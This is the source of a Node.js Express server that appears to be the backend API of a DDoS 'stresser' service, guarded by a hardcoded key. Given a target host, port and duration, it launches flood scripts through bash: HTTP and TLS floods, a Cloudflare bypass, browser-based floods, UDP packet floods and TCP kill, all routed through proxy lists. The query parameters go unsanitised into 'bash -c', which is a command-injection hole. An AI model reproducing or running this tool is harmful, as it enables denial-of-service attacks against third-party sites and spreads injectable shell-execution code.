const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2727;

const methods = {
    BYPASSCF: 'bypass-cf.js',
    BROWSER: 'browser.js',
    TCPKILL: 'tcp-kill',
    FLOOD: 'flood',
    TLS: 'tls.js',
    UDPPPS: 'udp-pps.go'
};

// Daftar proses yang berjalan
const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'FLOOD':
            return `node flood.js ${host} ${time} 8 4 proxy.txt`;
        case 'TLS':
            return `node tls.js ${host} ${time} 8 4 proxy.txt`;
        case 'BYPASSCF':
            return `node bypass-cf.js ${host} ${time} 10 2 proxy.txt --bfm true --cache true`;
        case 'BROWSER':
            return `node browser.js ${host} ${time} 8 1 proxy.txt 1`;
        case 'UDPPPS':
            return `./udp-pps ${host} ${port} ${time} 60`;
        case 'TCPKILL':
            return `./tcp-kill ${host} ${port} 40 ${time}`;
        default:
            return `node ${methods[method]} ${host} ${time}`;
    }
};

app.get('/api/thestresser', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'thestresser') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    // Simpan proses yang sedang berjalan
    activeProcesses.set(process.pid, process);
});

app.get('/api/thestresser', (req, res) => {
    const key = req.query.key;

    if (key !== 'thestresser') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server running at http://129.212.227.125:${port}`);
});